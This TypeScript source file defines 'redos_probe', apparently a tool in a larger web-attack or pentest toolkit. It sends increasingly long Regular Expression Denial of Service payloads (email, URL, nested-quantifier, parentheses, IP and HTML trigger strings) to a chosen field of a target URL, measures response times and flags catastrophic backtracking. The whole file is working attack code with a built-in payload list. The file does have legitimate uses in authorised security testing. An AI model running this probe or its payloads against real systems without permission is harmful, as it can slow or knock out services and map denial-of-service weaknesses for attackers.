// T65 — redos_probe
// ReDoS: sends increasing-length payloads to plot latency vs input size.
// Exponential growth signals catastrophic backtracking.

import { ToolDefinition, ToolResult } from '../types';
import { CommandExecutor } from '../executor';

const definition: ToolDefinition = {
  name: 'redos_probe',
  description:
    'Regular Expression Denial of Service (ReDoS) probe. Sends increasing-length payloads to the ' +
    'target field and plots response latency vs input size. Exponential or polynomial growth signals ' +
    'catastrophic backtracking in a server-side regex. Non-destructive: uses small increments up to ' +
    'max_length. Covers email, URL, name, and generic string patterns.',
  status: 'available',
  version: '1.0.0',
  parameters: [
    { name: 'url',        type: 'string', required: true,  description: 'Target URL' },
    { name: 'method',     type: 'string', required: false, description: 'HTTP method', default: 'POST' },
    { name: 'field',      type: 'string', required: true,  description: 'Vulnerable field name' },
    { name: 'base_value', type: 'string', required: false, description: 'Base value pattern to repeat', default: 'a' },
    { name: 'max_length', type: 'number', required: false, description: 'Maximum input length to test', default: 100 },
    { name: 'step',       type: 'number', required: false, description: 'Length increment per step', default: 10 },
    { name: 'headers',    type: 'string', required: false, description: 'JSON extra headers' },
    { name: 'timeout_ms', type: 'number', required: false, description: 'Per-request timeout ms', default: 15000 },
  ],
};

// Classic ReDoS trigger patterns for common regex types
const REDOS_PATTERNS = [
  { name: 'email_redos',   pattern: (n: number) => 'a'.repeat(n) + '@',                               desc: 'Email regex catastrophic backtracking' },
  { name: 'url_redos',     pattern: (n: number) => 'http://' + 'a'.repeat(n) + '!',                   desc: 'URL validation regex' },
  { name: 'spaces_redos',  pattern: (n: number) => 'a '.repeat(n) + '!',                              desc: 'Nested quantifier: (a )+' },
  { name: 'parens_redos',  pattern: (n: number) => '('.repeat(n) + 'a' + ')'.repeat(n),               desc: 'Balanced parentheses regex' },
  { name: 'ip_redos',      pattern: (n: number) => '1' + '.1'.repeat(n) + '.1.1',                     desc: 'IP address validation regex' },
  { name: 'html_redos',    pattern: (n: number) => '<a>' + '<b>'.repeat(n) + '</b>'.repeat(n) + '</a>', desc: 'HTML tag matching regex' },
];

export const redosProbeTool = {
  definition,
  async execute(params: Record<string, unknown>, _exec: CommandExecutor): Promise<ToolResult> {
    const url = String(params.url || '');
    const method = String(params.method || 'POST').toUpperCase();
    const field = String(params.field || '');
    const maxLength = Math.min(500, Math.max(20, Number(params.max_length || 100)));
    const step = Math.max(5, Number(params.step || 10));
    const timeoutMs = Number(params.timeout_ms || 15000);

    if (!url) return { output: 'url required', parsed: { error: 'missing_url' } };
    if (!field) return { output: 'field required', parsed: { error: 'missing_field' } };

    let headers: Record<string, string> = { 'User-Agent': 'Mozilla/5.0 GENESIS/4.0' };
    try { if (params.headers) Object.assign(headers, JSON.parse(String(params.headers))); } catch { /* ignore */ }

    async function probe(value: string): Promise<{ status: number; time_ms: number }> {
      const c = new AbortController();
      const t = setTimeout(() => c.abort(), timeoutMs);
      const t0 = Date.now();
      try {
        let r: Response;
        if (method === 'GET') {
          const sep = url.includes('?') ? '&' : '?';
          r = await fetch(`${url}${sep}${field}=${encodeURIComponent(value)}`, { headers, signal: c.signal });
        } else {
          r = await fetch(url, { method, headers: { ...headers, 'Content-Type': 'application/x-www-form-urlencoded' }, body: `${field}=${encodeURIComponent(value)}`, signal: c.signal });
        }
        clearTimeout(t);
        await r.text();
        return { status: r.status, time_ms: Date.now() - t0 };
      } catch {
        clearTimeout(t);
        return { status: 0, time_ms: Date.now() - t0 };
      }
    }

    // Warm up baseline
    const baseline = await probe('a');
    const baselineMs = baseline.time_ms;

    const allResults: Array<{ pattern: string; desc: string; lengths: number[]; times: number[]; growth: string; interesting: boolean }> = [];

    for (const pat of REDOS_PATTERNS) {
      const lengths: number[] = [];
      const times: number[] = [];

      for (let n = step; n <= maxLength; n += step) {
        const value = pat.pattern(n);
        const { time_ms } = await probe(value);
        lengths.push(n);
        times.push(time_ms);
        // Early exit if clearly exponential
        if (time_ms > 5000) break;
      }

      // Analyse growth: fit linear vs exponential
      // Simple heuristic: if last/first > 4x when length doubles, flag as super-linear
      let growth = 'linear';
      let interesting = false;
      if (times.length >= 2) {
        const firstTime = times[0] || 1;
        const lastTime = times[times.length - 1] || 1;
        const ratio = lastTime / firstTime;
        const lenRatio = (lengths[lengths.length - 1] || 1) / (lengths[0] || 1);
        if (ratio > lenRatio * 2) { growth = 'super-linear'; interesting = true; }
        if (ratio > lenRatio * 4) { growth = 'exponential'; interesting = true; }
        // Also flag if absolute time > 2s
        if (lastTime > 2000) interesting = true;
      }

      allResults.push({ pattern: pat.name, desc: pat.desc, lengths, times, growth, interesting });
    }

    const flagged = allResults.filter(r => r.interesting);
    const lines = [
      `redos_probe — ${REDOS_PATTERNS.length} ReDoS patterns  max_length=${maxLength}  step=${step}`,
      `Target: ${url.substring(0, 80)}  field="${field}"`,
      `Baseline response time: ${baselineMs}ms`,
      `ReDoS candidates: ${flagged.length}/${allResults.length}`,
      '─'.repeat(72),
    ];
    for (const r of allResults) {
      const flag = r.interesting ? '⚡ REDOS    ' : '  ·        ';
      const lastTime = r.times[r.times.length - 1] || 0;
      const sample = r.lengths.slice(0, 4).map((l, i) => `n=${l}→${r.times[i]}ms`).join('  ');
      lines.push(`  ${flag}  [${r.pattern.padEnd(16)}]  growth=${r.growth}  max=${lastTime}ms  ${sample}`);
    }

    return {
      output: lines.join('\n'),
      parsed: { baseline_ms: baselineMs, interesting_count: flagged.length, interesting: flagged, results: allResults },
    };
  },
};
